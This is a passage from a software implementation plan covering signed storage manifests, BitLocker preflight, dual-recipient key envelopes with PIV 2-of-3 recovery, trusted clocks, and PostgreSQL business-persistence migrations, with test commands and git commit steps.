    pub revision: u64,
    pub issued_at: TrustedUtc,
    pub f56_deployment_manifest_sha256: Sha256Digest,
    pub deployment_id: uuid::Uuid,
    pub software_volume_id: String,
    pub software_root: std::path::PathBuf,
    pub data_volume_id: String,
    pub data_root: std::path::PathBuf,
    pub backup_target_ids: Vec<String>,
    pub hardware_profile_id: HardwareProfileId,
    pub authority_epoch: u64,
    pub employee_api_origin: HttpsOrigin,
    pub policy_ids: Vec<String>,
    pub trust_root_ref: String,
    pub trust_root_digest: Sha256Digest,
    pub root_generation: u64,
    pub revocation_ref: String,
    pub checkpoint_ref: String,
}

pub type SignedEnvelopeV1<T> = SignedBusinessArtifactV1<T>;
pub type SignedF57AuthorityStorageManifestV1 = SignedBusinessArtifactV1<F57AuthorityStorageManifestPayloadV1>;

pub struct VerifiedSignatureEvidence {
    pub algorithm: ClosedCmsAlgorithm,
    pub chain_sha256: Sha256Digest,
    pub trust_bundle_sha256: Sha256Digest,
    pub highest_crl_numbers: Vec<CrlNumber>,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum PersistentClass {
    PostgresData, PostgresWal, PostgresTemp, Attachment, Audit, SearchIndex,
    ApplicationLog, Temp, Spool, Export, PluginWork, Quarantine, Dump, BackupStaging,
    Package, Secret, Evidence, Generation, ContainerScratch, PageFile, Hibernation,
    VssSnapshot, SystemTrace, PrintSpool,
}

pub enum PersistenceDisposition {
    Routed(ValidatedDataPath),
    Disabled,
    SsdCodeOnlyNarrowException(SsdException),
}

pub enum SsdException { BitLockerProtectorMetadata, FixedEventCodeAndRandomIncidentId }

pub struct DualRecipientDataKeyEnvelopeV1 {
    pub operational_wrapped_key: NonEmptySecretBytes,
    pub operational_wrap_key_version: std::num::NonZeroU32,
    pub operational_recipient_ref: RecipientRef,
    pub recovery_wrapped_key: NonEmptySecretBytes,
    pub recovery_wrap_key_version: std::num::NonZeroU32,
    pub recovery_recipient_ref: RecipientRef,
    pub wrap_context_generation: std::num::NonZeroU32,
    pub wrap_envelope_version: std::num::NonZeroU32,
}
```

The payload and detached envelope are separate so signature/digest fields never self-reference. This task does **not** redefine F-55/F-56's unique Stage-14 `DeploymentManifestV1` or its exact `EP-DEPLOYMENT-MANIFEST-V1` wire. It first verifies that artifact unchanged, then verifies `SignedF57AuthorityStorageManifestV1` as the F-57 storage/boot supplement. The supplement fixes `schema_version=1`、`purpose="EP-F57-AUTHORITY-STORAGE-MANIFEST-V1"` and `cms_signing_time=issued_at`; `f56_deployment_manifest_sha256` must equal the installed F-56 exact manifest bytes, while `deployment_id` and `employee_api_origin` must equal that verified manifest. A mismatch, attempted field merge or a second artifact named `DeploymentManifestV1` fails before database/config access.

`employee_api_origin` is the current migration API's only target and must be an HTTPS origin with no path/query/fragment; reject loopback/localhost, direct core-server, named-pipe, redirect, system-proxy and command/template override paths. `SignedEnvelopeV1<T>` is only a compatibility alias for F-56's single `SignedBusinessArtifactV1<T>` verifier, not a second signature grammar: strict RFC 8785 JCS payload, lower-hex `Sha256Digest`, `spki-sha256:` signer token, canonical base64url detached CMS, the F-56 closed ECDSA-P256/RSA-PSS profiles and pinned offline chain/full-CRL evaluation. Free-form algorithm strings, raw-signature aliases, Windows root-store lookup, online chain completion and unknown fields are rejected; chain/revocation evidence is verifier output rather than a caller claim. Canonical JCS verification uses `AuthorityStorageManifestLoader::load_and_verify(path, verified_f56_manifest, trust) -> Result<VerifiedAuthorityStorageManifest, StorageManifestError>` and enforces exact schema version/purpose, monotonic revision, size/time limits, unknown-field rejection, cross-manifest equality, stable volume/filesystem bindings and revocation/anti-rollback checkpoints. The only SSD trust material is the non-secret customer public root; WDAC authenticates the enrollment/verification code, not that mutable root file. A two-person root-enrollment ceremony binds `trust_root_digest + root_generation` into TPM NV/sealed monotonic state and an independently held server-external checkpoint before the root is accepted. `StoragePolicy::validate(&VerifiedAuthorityStorageManifest, &dyn VolumeProbe) -> Result<ValidatedDataRoot, StorageError>` compares final-handle Windows volume/device identity, rejects equal software/data volumes, rejects an unencrypted data volume and missing backup target IDs, and returns an exact disposition for every persistent class. Customer-bearing classes are routed under the HDD data root or disabled; hibernation is always disabled, pagefile and dumps are HDD-routed or disabled, and VSS/Search/trace/spool classes are explicitly routed or disabled. Only BitLocker protector metadata and the fixed-code/random-incident Event Log narrow exceptions can use SSD. HDD strictness applies to authority-node customer content and customer-linkable derivatives; Task 18 separately permits only bounded, encrypted, revocable and non-authoritative endpoint cache.

Persist the highest accepted manifest revision/digest, root generation/digest and revocation checkpoint in TPM-sealed monotonic state and an independently signed server-external checkpoint; reject rollback or disagreement. Normal boot depends on the local TPM checkpoint and never performs a pre-vault network read. After the vault opens, the service periodically cross-checks the external checkpoint through the authenticated backup channel; a signed age over 24 hours forces control-plane/read-only mode and blocks business writes/release until reconciliation. Clean-machine recovery uses the offline exact checkpoint bundle. Root enrollment/rotation uses a separate two-person batch from deployment-manifest approval, and one approval can never replace both manifest and root. Tests replace root+manifest together, roll the root generation back and clear/replace TPM state; each fails before any database connection. A recovery bundle contains the exact manifest, root certificate, root-generation record, revocation material and last trusted checkpoint, all digest-bound and separately signed.

Define `SecretHandle { vault_id, key_version, invocation_nonce }` with private fields. `CustomerVault::open_for_call(ctx, secret_id) -> Result<SecretHandle, SecretError>` binds the handle to one authenticated command invocation; no plugin/client API returns raw secret bytes. Store ciphertext and vault metadata only under `ValidatedDataRoot`.

Implement [ADR-0020](../../adr/ADR-0020-dual-recipient-data-key-recovery.md) exactly for every `data_keys` row. Generate each customer DEK once, then create two independently authenticated envelopes for that same DEK: one to the operational TPM/HSM/KMS recipient and one to a distinct offline recovery recipient. Either correct path can recover the same DEK; this is not 2-of-2. The persisted envelope shape is exactly the eight non-null fields in `DualRecipientDataKeyEnvelopeV1`; no singular compatibility field or provider-private locator is accepted. Both envelope AAD/bindings include deployment, legal entity, purpose, data-key id/version, wrap-context generation, recipient and envelope version. Wrapped bytes must be non-empty; all wrap-key versions/generations/envelope versions must be positive and no greater than i32::MAX at the persistence boundary; recipient refs must be canonical, non-empty and different. Existing purpose↔algorithm, state/time-shape, exact-ref/cache/readback and four-purpose × four-scope 16-row activation constraints remain mandatory. Normal readiness/readback uses only the operational envelope; operational services have no recovery API.

Both columns/parsers must use ADR-0020 §§6–9 byte-for-byte: strict JCS `OperationalDataKeyEnvelopeV1` plus the two-profile brokered provider ABI/KAT；JCS `DataKeyRecoveryEnvelopeV1`；both domain-separated exact AADs；`vsss-rs=5.4.0` GF(256) 2-of-3 share wire；PIV slot-9D P-256 ECDH/HKDF/AES-GCM encrypted shares；and the signed single-use conditional-union `DataKeyRecoveryManifestPayloadV1` with predecessor-linked rotation/revocation. Add the manifest payload to the shared signature registry and application-recovery-only roster; a storage-manifest, backup or release signer cannot authorize it. The two committed KAT fixtures and JSON Schemas are normative test inputs, while production rejects fixture RNG/material. Provider-private operational bytes、arbitrary AAD、other Shamir/share numbering、PIV/RSA convenience recovery profile、partial token replacement or a manifest that does not bind the target recovery set is an interoperability failure, not an implementation option.

The low-cost P340 recovery carrier is `PIV_SHAMIR_2_OF_3_V1`: a CSPRNG-generated 256-bit recovery KEK is split by a pinned, SBOM-recorded `vsss-rs` implementation into three shares, each encrypted to a distinct offline PIV hardware token/custodian. `apps/recovery-tool` is the only executable ceremony: its strict CLI accepts only a signed recovery-manifest path and operation code, `manifest.rs` reuses the Task 2 CMS verifier, `piv.rs` talks to the allowlisted tokens, `ceremony.rs` enforces two distinct custodians and `memory.rs` owns locked/zeroizing buffers. It requires two tokens, user presence/PIN and an approved recovery manifest, reconstructs only in `VirtualLock`/`Zeroizing` memory, unwraps with AES-256-GCM plus the full ADR-0020 binding, and forbids secrets in argv, environment, ordinary files, logs or crash dumps. All three valid two-share combinations must recover the same DEK; every single share, duplicate custodian, wrong recipient/binding/generation and any attempt by an operational service to invoke recovery must fail. Clean recovery rewraps the recovered DEK to the new host's operational recipient. Known-answer/interoperability tests, lost/stolen-share rotation and post-use zeroization are mandatory. BitLocker OS/data keys, application-vault shares and backup recovery/signing materials use separate token/envelope sets and custody records；no single person or operational recipient can recover any domain. Replace the current Windows refusal in `crates/adapter/kms/src/masterkey.rs` with injected vault/wrapping ports—never a plaintext or software-root master-key fallback.

Create one cross-domain `RecoveryDomainSeparationEvidenceV1` as a required production artifact with strict fields `schema_version=1,deployment_id,evidence_id,bitlocker_os_key_ref,bitlocker_os_custody_record_id,bitlocker_os_custodian_ids,bitlocker_data_key_ref,bitlocker_data_custody_record_id,bitlocker_data_custodian_ids,application_recipient_ref,application_piv_token_ids,application_custodian_ids,application_envelope_profile,backup_recipient_ref,backup_piv_token_ids,backup_custodian_ids,backup_envelope_profile,backup_signer_ref,writer_principal,recovery_principal,verified_at,generation,evidence_digest`。Each BitLocker custodian list has exactly two distinct people；each PIV token/custodian list has exactly three, and application vs backup token and custodian sets are disjoint (six tokens/six nonoverlapping holders). All four key/recipient/token sets, custody-record IDs, envelope/PIN/rotation ceremonies and purposes are pairwise distinct；the OS and data BitLocker custody pairs may share an individual only if the pair/record is not identical and neither individual alone holds a recovery key, but cannot reuse either PIV token set. Writer, target, signer, operational recipient and recovery principals are mutually unauthorized outside their exact domain. Canonical set-intersection checks, not display names, prove separation. Missing/duplicate token, same application/backup custodian, same OS/data key or custody record, recipient/envelope reuse, one operational recipient with recovery access, signer/writer reuse or any single-person recovery makes readiness fail.

Implement ADR-0020 §八点一 rather than inventing a PIV registry. `crates/platform/secrets/src/recovery_domain.rs` owns shared strict `RecoveryDomainDescriptorV1` plus distinct public `ApplicationRecoveryDomainManifestPayloadV1`/`BackupRecoveryDomainManifestPayloadV1` newtypes、the three-recipient descriptor、recipient-set digest、compile-time purpose checks and current/history/CAS loader. Task 2 creates and tests only the APPLICATION current/history under the fixed HDD locator and application-recovery-domain signer roster；Task 24 later activates BACKUP with a disjoint roster. Both consume the Task 1 `f57-recovery-domain-manifest.schema.json`. New wrapping locks the verified manifest payload digest；rotation is old+1 with predecessor and server-external revocation checkpoint, never a mutable “current registry” lookup. Tests cover all three recipient positions、certificate/attestation/key-version validity、expiry/revocation、history retention、atomic replacement/crash、wrong purpose/signer、same token/custodian/SPKI and cross-domain reuse. `RecoveryDomainSeparationEvidenceV1` exact-joins both manifest payload digests and recipient-set digests once Task 24 exists；until then its backup side remains explicitly `UNCERTIFIED`, never synthesized.

Define `TrustedClockV1::now() -> Result<TrustedInstant, TimeUntrusted>` and monotonic elapsed/deadline operations in foundation/runtime before grants, signatures or leases are implemented. In this task, replace every current production `Utc::now()`/`SystemTime::now()` site listed in **Files**: identity/session/MFA/break-glass/maintenance/guard and transaction expiry consume `TrustedClockV1`; job leases and migration locks/history/preflight consume the same trusted instant plus monotonic duration; incident/observability timestamps consume an injected reporting clock but never authorize a command. Tasks 8, 9, 12, 13, 14 and 18 continue to inject these ports. The architecture check forbids direct wall-clock reads in production security decisions and permits only explicit fake clocks in test fixtures—there is no broad or undated allowlist. Task 24 supplies the real W32Time-backed provider and persistent rollback checkpoint; before that provider is certified, production startup remains fail-closed while unit/integration tests inject deterministic clocks.

- [ ] **Step 4: Implement the non-circular bootstrap and BitLocker preflight**

Freeze this order in `SecretBootstrap::open`: (1) verify signed binary/WDAC policy, then validate the permitted non-secret customer public root against the mandatory TPM-NV/sealed `root_generation + digest` checkpoint without network access; (2) prove trusted boot and BitLocker auto-unlock, enumerate non-OS volumes and read the detached-signed manifest from the fixed HDD `packages` locator; (3) verify its final-handle volume identity, then compare manifest revision/digest and root reference with the sealed monotonic checkpoints; (4) use the operational TPM/HSM recipient or independent recovery recipient to unwrap the HDD pre-DB vault envelope and database credential; (5) make the first PostgreSQL connection; (6) compare database key/vault metadata/digests with the pre-DB envelope, then perform the post-vault external-checkpoint cross-check. Database rows are never the sole source of the credential. Missing secret, manifest/root replacement by one local administrator, root or manifest rollback, SSD manifest, volume swap and `data_root` moved to SSD all fail with database connect count zero; an empty/unreachable database does not prevent vault unsealing. Clean-machine recovery starts with the offline exact manifest/root/root-generation/revocation/checkpoint bundle.

Under the same highest security tier, boot modes are mutually exclusive. The current P340 baseline is fixed to `TPM_ONLY_UNATTENDED`, which permits UPS-driven unattended restart. A deployment may instead certify `TPM_PIN_ATTENDED`, but then it must not claim unattended restart and must measure attended RTO/alerting separately. Permit on SSD only OS-managed sealed protector metadata, never an application master key/customer secret. The data HDD uses auto-unlock only after trusted boot. Verify Secure Boot, expected PCR binding, exact protectors and auto-unlock before service start. OS-volume and data-volume recovery keys are independently held offline by two custodians and are separate from application-vault and backup-recovery keys. Add negative fixtures for TPM/OS-disk loss, stolen single recovery key and both boot-mode restart paths.

Require BitLocker software encryption with XTS-AES-256; reject opaque hardware self-encryption. OS, data and offline media must report 100% encryption before any customer content is written, with exact protector set, recovery domain, encryption method and status evidence. First-release customer/business volumes are NTFS only; reject ReFS/FAT/exFAT. Record GPT layout, cluster size and logical/physical sector sizes and require a measured durable-flush/power-loss test.

- [ ] **Step 5: Add real vault, cross-machine restore and Event Log negative coverage**

Extend the mixed-workload test to inspect PostgreSQL data/WAL/temp, attachments, audit/application logs, exports, packages, secrets, evidence, generations, plugin/container scratch, pagefile and dumps by final-handle volume/device identity; unknown paths fail closed. Negative paths cover reparse points, junctions, mount points, hardlinks, alternate data streams, volume swap, open/check TOCTOU and service TEMP/profile defaults. Create a customer-key fixture, wrap it to both recipients, prove normal unwrapping through a call-scoped handle, reject a persisted handle in a second invocation, and restore on a clean-machine fixture using two of three separately held application PIV shares plus HDD backup. Test one lost/stolen share, share rotation, the third-token fallback pair and failure with any single custodian. Build the full `RecoveryDomainSeparationEvidenceV1` and test all four domain set intersections plus application/backup six-token/six-holder exact separation; each duplicate key/token/recipient/custody record/envelope/purpose and signer/writer/operational/recovery privilege crossover fails. The authority SSD Windows Event Log may contain only a fixed event code and random incident ID; negative tests reject customer values, object IDs and customer-content hashes. Persist the signed manifest mirror and vault metadata only after pre-DB verification; never persist private recovery keys.

Run: `cargo test -p recovery-tool --test piv_2of3 && cargo test -p ep-adapter-kms --test dual_recipient_data_key && cargo test -p ep-adapter-db-pg --test data_keys_dual_envelope && cargo test -p ep-testkit --test f57_storage_boundary --test f57_storage_key_boundary --test f57_secret_recovery --test f57_data_key_recovery --test f57_trusted_clock -- --nocapture`

Expected: PASS with the exact eight non-null ADR-0020 columns and no singular compatibility columns；positive lengths/versions/generation, distinct recipients, state/purpose constraints and full AAD binding；all three valid application-domain two-share combinations, every single-share failure, cross-machine recovery, lost/stolen-share rotation, post-use zeroization, and a valid `RecoveryDomainSeparationEvidenceV1` proving separate BitLocker OS, BitLocker data, application-vault and backup domains including six nonoverlapping application/backup PIV holders. Every cross-domain reuse negative fails. Also require zero customer-content SSD writes, zero customer-linkable Event Log payload and zero direct wall-clock security decision.

- [ ] **Step 6: Run architecture, SQL and unit gates**

Run: `cargo xtask sqlcheck && cargo test -p ep-foundation -p ep-platform-runtime -p ep-platform-secrets -p ep-adapter-file -p ep-adapter-kms -p recovery-tool -p core-server -p ep-testkit && cargo xtask archcheck && cargo xtask f57check --task F57-02 --phase post-green`

Expected: PASS with zero warning, no raw persistent authority path outside storage policy and no Windows plaintext master-key fallback.

- [ ] **Step 7: Commit**

```bash
git add -- testkit/tests/f57_storage_key_boundary.rs crates/foundation/src/authority.rs crates/foundation/src/port/mod.rs crates/foundation/src/port/kms.rs crates/foundation/src/port/time.rs
git add -- crates/foundation/src/lib.rs crates/foundation/Cargo.toml Cargo.lock crates/platform/runtime/src/deployment.rs crates/platform/runtime/src/bitlocker.rs crates/platform/runtime/src/trusted_clock.rs
git add -- crates/platform/runtime/src/storage_policy.rs crates/platform/runtime/tests/storage_policy.rs crates/platform/runtime/tests/bitlocker.rs crates/platform/runtime/tests/trusted_clock.rs crates/platform/runtime/src/lib.rs crates/platform/runtime/src/boot.rs
git add -- crates/platform/runtime/src/config/sections.rs crates/platform/runtime/Cargo.toml crates/platform/secrets/Cargo.toml crates/platform/secrets/src/lib.rs crates/platform/secrets/src/handle.rs crates/platform/secrets/src/bootstrap.rs
git add -- crates/platform/secrets/src/manifest.rs crates/platform/secrets/src/ports.rs crates/platform/secrets/src/recovery.rs crates/platform/secrets/src/recovery_bundle.rs crates/platform/secrets/src/recovery_domain.rs crates/platform/secrets/tests/recovery_domain_manifest.rs crates/platform/secrets/tests/cross_machine_restore.rs Cargo.toml
git add -- crates/adapter/file/src/vault.rs crates/adapter/file/src/lib.rs crates/adapter/file/Cargo.toml crates/adapter/kms/src/tpm.rs crates/adapter/kms/src/recovery.rs crates/adapter/kms/src/envelope.rs
git add -- crates/adapter/kms/src/material.rs crates/adapter/kms/src/lib.rs crates/adapter/kms/src/masterkey.rs crates/adapter/kms/Cargo.toml crates/adapter/kms/tests/dual_recipient_data_key.rs crates/adapter/kms/tests/fixtures/adr0020-operational-envelope-v1.json crates/adapter/kms/tests/fixtures/adr0020-piv-shamir-v1.json apps/recovery-tool/Cargo.toml
git add -- apps/recovery-tool/src/lib.rs apps/recovery-tool/src/main.rs apps/recovery-tool/src/cli.rs apps/recovery-tool/src/piv.rs apps/recovery-tool/src/manifest.rs apps/recovery-tool/src/ceremony.rs
git add -- apps/recovery-tool/src/memory.rs apps/recovery-tool/tests/piv_2of3.rs apps/core-server/src/lib.rs apps/core-server/src/wiring/secrets.rs apps/core-server/src/wiring/bitlocker.rs apps/core-server/src/main.rs
git add -- apps/core-server/src/config.rs apps/core-server/src/wiring/mod.rs apps/core-server/src/platform/identity.rs apps/core-server/src/platform/identity_admin.rs apps/core-server/src/platform/middleware.rs apps/core-server/Cargo.toml
git add -- apps/job-worker/src/config.rs apps/job-worker/src/jobs.rs apps/job-worker/Cargo.toml crates/adapter/db-pg/src/platform_core/guard.rs crates/adapter/db-pg/src/platform_core/identity_accounts.rs crates/adapter/db-pg/src/platform_core/identity_breakglass.rs
git add -- crates/adapter/db-pg/src/platform_core/identity_sessions.rs crates/adapter/db-pg/src/platform_core/windows.rs crates/adapter/db-pg/src/platform_core/key_domain.rs crates/adapter/db-pg/src/tx.rs crates/adapter/db-pg/Cargo.toml crates/adapter/db-pg/tests/data_keys_dual_envelope.rs
git add -- crates/platform/identity/src/account_admin.rs crates/platform/identity/src/breakglass.rs crates/platform/identity/src/context_build.rs crates/platform/identity/src/enrollment.rs crates/platform/identity/src/lifecycle.rs crates/platform/identity/src/maintenance.rs
git add -- crates/platform/identity/src/mfa.rs crates/platform/identity/src/password.rs crates/platform/identity/src/session.rs crates/platform/identity/Cargo.toml crates/platform/obs/src/log/mod.rs crates/platform/obs/Cargo.toml
git add -- crates/platform/runtime/src/incident.rs tools/migrate/src/apply.rs tools/migrate/src/concurrent.rs tools/migrate/src/genrls.rs tools/migrate/src/history.rs tools/migrate/src/manifest.rs
git add -- tools/migrate/src/preflight.rs tools/migrate/Cargo.toml xtask/src/archcheck/source.rs db/migrations/platform_ops/V20261025090000__platform_ops_create_deployment_manifests.sql db/migrations/platform_core/V20261025090100__platform_core_create_customer_secret_vault.sql testkit/tests/f57_storage_boundary.rs
git add -- docs/evidence/f57-data-key-recovery-manifest.schema.json testkit/tests/f57_secret_recovery.rs testkit/tests/f57_data_key_recovery.rs testkit/tests/f57_trusted_clock.rs testkit/Cargo.toml
git commit -m "feat: establish signed storage and recoverable vault"
```

### Task 3: Materialize MDM, CRM, CPQ, CLM and sales persistence

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Modify: `docs/data-dictionary/mdm.md`, `docs/data-dictionary/cpq.md`, `docs/data-dictionary/clm_sales.md`
- Modify: `crates/contract/mdm/src/lib.rs`, `crates/contract/crm/src/lib.rs`, `crates/contract/cpq/src/lib.rs`, `crates/contract/clm/src/lib.rs`, `crates/contract/sales/src/lib.rs`
- Modify: `crates/domain/mdm/src/lib.rs`, `crates/domain/crm/src/lib.rs`, `crates/domain/cpq/src/lib.rs`, `crates/domain/clm/src/lib.rs`, `crates/domain/sales/src/lib.rs`
- Modify: `crates/application/mdm/src/lib.rs`, `crates/application/crm/src/lib.rs`, `crates/application/cpq/src/lib.rs`, `crates/application/clm/src/lib.rs`, `crates/application/sales/src/lib.rs`
- Modify: `crates/contract/{mdm,crm,cpq,clm,sales}/Cargo.toml`
- Modify: `crates/domain/{mdm,crm,cpq,clm,sales}/Cargo.toml`
- Modify: `crates/application/{mdm,crm,cpq,clm,sales}/Cargo.toml`
- Create: `crates/adapter/db-pg/src/mdm/mod.rs`, `crates/adapter/db-pg/src/mdm/repository.rs`
- Create: `crates/adapter/db-pg/src/crm/mod.rs`, `crates/adapter/db-pg/src/crm/repository.rs`
- Create: `crates/adapter/db-pg/src/cpq/mod.rs`, `crates/adapter/db-pg/src/cpq/repository.rs`
- Create: `crates/adapter/db-pg/src/clm/mod.rs`, `crates/adapter/db-pg/src/clm/repository.rs`
- Create: `crates/adapter/db-pg/src/sales/mod.rs`, `crates/adapter/db-pg/src/sales/repository.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`, `crates/adapter/db-pg/Cargo.toml`
- Modify: `crates/platform/file/src/lib.rs`, `crates/platform/file/Cargo.toml`
- Create: `db/migrations/platform_file/V20261025090150__platform_file_create_objects_and_versions.sql`
- Create: `db/migrations/mdm/V20261025090200__mdm_create_current_business_tables.sql`
- Create: `db/migrations/crm/V20261025090300__crm_create_current_business_tables.sql`
- Create: `db/migrations/cpq/V20261025090400__cpq_create_current_business_tables.sql`
- Create: `db/migrations/clm/V20261025090500__clm_create_current_business_tables.sql`
- Create: `db/migrations/sales/V20261025090600__sales_create_current_business_tables.sql`
- Create: `tools/migrate/src/lib.rs`
- Modify: `tools/migrate/src/main.rs`
- Modify: `tools/migrate/Cargo.toml`
- Modify: `Cargo.toml`
- Create: `testkit/src/f57_pg.rs`
- Modify: `testkit/src/lib.rs`
- Create: `testkit/tests/f57_business_baseline_a.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Tasks 1–2 and MDM/CRM/CPQ/CLM/SAL traceability rows.
- Produces: application repository ports, protected current tables, immutable history/facts and five `Pg*Repository` adapters. No business HTTP handler is exposed yet.

- [ ] **Step 1: Write the failing fresh-PostgreSQL repository contract test**

`f57_business_baseline_a` consumes only the already-created/already-migrated `EP_TEST_DATABASE_URL` injected by `FreshPg16TaskGate`, asserts `EP_TEST_PG16_ADMIN_URL` is absent from its process, verifies `platform_core.schema_history` ends exactly at `20261025090600`, and then verifies create/read/version/concurrency/RLS negatives only through application repository ports. It neither creates、migrates nor drops a database and is not ignored；absence of the child URL or presence of an administrator URL is failure. Only the parent gate invokes the existing `ep-migrate` binary and owns database lifecycle. `testkit/Cargo.toml` adds `ep-adapter-db-pg`, Tokio and the five exact application/contract crates as dev dependencies；the test must not depend on `ep-migrate` or a database-administration helper, and later persistence tasks extend only their exact application/contract/adapter test dependencies.

Run: `cargo xtask f57check --task F57-03 --phase pre-red && cargo test -p ep-testkit --test f57_business_baseline_a -- --nocapture`

Expected: FAIL because the ports, adapters and five aggregate migrations do not exist.

- [ ] **Step 2: Implement owner contracts, schemas and adapters**

Add typed IDs, commands/facts and transaction-aware repository ports for master-data versions, opportunities/follow-ups, quote versions, contract versions/payment schedules/attachments/obligations and order versions/lines/schedules. CRM owns opportunities; CPQ owns quotes. Before any business attachment link table, the dedicated `90150` migration creates `platform_file.attachment_objects` and immutable `attachment_versions` identities, exact composite legal-entity keys, RLS and append-only version identity; it creates no upload/publication route. The shared reference is only `PublishedAttachmentRefV1={object_id,version_id}`，never a bare object ID or mutable “latest” alias. Every business link stores both IDs plus legal entity and has a composite FK to the exact immutable version; the owner repository later accepts the link only after Task 16's publication invariant is true. Each business migration creates complete current plus immutable history/fact tables, composite legal-entity foreign keys, RLS, optimistic-version constraints, append-only guards and exact unpoliced-table registration. Repositories accept caller-owned `PgTx` and all modules/manifests are wired.

- [ ] **Step 3: Run the complete slice**

Run: `cargo test -p ep-contract-mdm -p ep-contract-crm -p ep-contract-cpq -p ep-contract-clm -p ep-contract-sales -p ep-domain-mdm -p ep-domain-crm -p ep-domain-cpq -p ep-domain-clm -p ep-domain-sales -p ep-app-mdm -p ep-app-crm -p ep-app-cpq -p ep-app-clm -p ep-app-sales -p ep-adapter-db-pg && cargo test -p ep-testkit --test f57_business_baseline_a -- --nocapture && cargo xtask sqlcheck && cargo xtask f57check --task F57-03 --phase post-green`

Expected: PASS on fresh PostgreSQL 16, including cross-legal-entity and concurrent-version negatives.

- [ ] **Step 4: Commit**

```bash
git add -- docs/data-dictionary/mdm.md docs/data-dictionary/cpq.md docs/data-dictionary/clm_sales.md crates/contract/mdm/src/lib.rs crates/contract/crm/src/lib.rs crates/contract/cpq/src/lib.rs
git add -- crates/contract/clm/src/lib.rs crates/contract/sales/src/lib.rs crates/domain/mdm/src/lib.rs crates/domain/crm/src/lib.rs crates/domain/cpq/src/lib.rs crates/domain/clm/src/lib.rs
git add -- crates/domain/sales/src/lib.rs crates/application/mdm/src/lib.rs crates/application/crm/src/lib.rs crates/application/cpq/src/lib.rs crates/application/clm/src/lib.rs crates/application/sales/src/lib.rs
git add -- crates/contract/{mdm,crm,cpq,clm,sales}/Cargo.toml crates/domain/{mdm,crm,cpq,clm,sales}/Cargo.toml crates/application/{mdm,crm,cpq,clm,sales}/Cargo.toml crates/adapter/db-pg/src/mdm/mod.rs crates/adapter/db-pg/src/mdm/repository.rs crates/adapter/db-pg/src/crm/mod.rs
git add -- crates/adapter/db-pg/src/crm/repository.rs crates/adapter/db-pg/src/cpq/mod.rs crates/adapter/db-pg/src/cpq/repository.rs crates/adapter/db-pg/src/clm/mod.rs crates/adapter/db-pg/src/clm/repository.rs crates/adapter/db-pg/src/sales/mod.rs
git add -- crates/adapter/db-pg/src/sales/repository.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml crates/platform/file/src/lib.rs crates/platform/file/Cargo.toml db/migrations/platform_file/V20261025090150__platform_file_create_objects_and_versions.sql
git add -- db/migrations/mdm/V20261025090200__mdm_create_current_business_tables.sql db/migrations/crm/V20261025090300__crm_create_current_business_tables.sql db/migrations/cpq/V20261025090400__cpq_create_current_business_tables.sql
git add -- db/migrations/clm/V20261025090500__clm_create_current_business_tables.sql db/migrations/sales/V20261025090600__sales_create_current_business_tables.sql tools/migrate/src/lib.rs tools/migrate/src/main.rs tools/migrate/Cargo.toml Cargo.toml
git add -- testkit/src/f57_pg.rs testkit/src/lib.rs testkit/tests/f57_business_baseline_a.rs testkit/Cargo.toml
git commit -m "feat: materialize customer contract sales persistence"
```

### Task 4: Materialize procurement, inventory and operating-finance persistence

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Modify: `docs/data-dictionary/procure.md`, `docs/data-dictionary/finance.md`, `docs/data-dictionary/invoice.md`, `docs/data-dictionary/ledger.md`
- Modify: `crates/contract/procure/src/lib.rs`, `crates/contract/inventory/src/lib.rs`, `crates/contract/costing/src/lib.rs`, `crates/contract/invoice/src/lib.rs`, `crates/contract/finance/src/lib.rs`, `crates/contract/ledger/src/lib.rs`
- Modify: `crates/domain/procure/src/lib.rs`, `crates/domain/inventory/src/lib.rs`, `crates/domain/costing/src/lib.rs`, `crates/domain/invoice/src/lib.rs`, `crates/domain/finance/src/lib.rs`, `crates/domain/ledger/src/lib.rs`
- Modify: `crates/application/procure/src/lib.rs`, `crates/application/inventory/src/lib.rs`, `crates/application/costing/src/lib.rs`, `crates/application/invoice/src/lib.rs`, `crates/application/finance/src/lib.rs`, `crates/application/ledger/src/lib.rs`
- Modify: `crates/contract/{procure,inventory,costing,invoice,finance,ledger}/Cargo.toml`
- Modify: `crates/domain/{procure,inventory,costing,invoice,finance,ledger}/Cargo.toml`
- Modify: `crates/application/{procure,inventory,costing,invoice,finance,ledger}/Cargo.toml`
- Create: `crates/adapter/db-pg/src/procure/mod.rs`, `crates/adapter/db-pg/src/procure/repository.rs`
- Create: `crates/adapter/db-pg/src/inventory/mod.rs`, `crates/adapter/db-pg/src/inventory/repository.rs`
- Create: `crates/adapter/db-pg/src/costing/mod.rs`, `crates/adapter/db-pg/src/costing/repository.rs`
- Create: `crates/adapter/db-pg/src/invoice/mod.rs`, `crates/adapter/db-pg/src/invoice/repository.rs`
- Create: `crates/adapter/db-pg/src/finance/mod.rs`, `crates/adapter/db-pg/src/finance/repository.rs`
- Create: `crates/adapter/db-pg/src/ledger/mod.rs`, `crates/adapter/db-pg/src/ledger/repository.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`, `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/procure/V20261025090700__procure_create_current_business_tables.sql`
- Create: `db/migrations/inventory/V20261025090800__inventory_create_current_business_tables.sql`
- Create: `db/migrations/costing/V20261025090900__costing_create_current_business_tables.sql`
- Create: `db/migrations/invoice/V20261025091000__invoice_create_current_business_tables.sql`
- Create: `db/migrations/finance/V20261025091100__finance_create_current_business_tables.sql`
- Create: `db/migrations/ledger/V20261025091200__ledger_create_current_business_tables.sql`
- Create: `testkit/tests/f57_business_baseline_b.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:** Tasks 3–4 produce transaction-aware ports/adapters for requisition/PO/receipt, inventory events/balances, costing layers, invoices, cash/allocation and balanced operating entries; statutory books remain an external-provider interface.

- [ ] **Step 1: Write the failing fresh-PostgreSQL financial contract test**

Test quantity/value conservation, no negative stock, immutable invoice/cash/inventory facts, balanced entries, allocation ceilings, irreversible operating-period lock and late-fact forwarding. Verify negatives at COMMIT.

Run: `cargo xtask f57check --task F57-04 --phase pre-red && cargo test -p ep-testkit --test f57_business_baseline_b -- --nocapture`

Expected: FAIL because the six persistence slices do not exist.

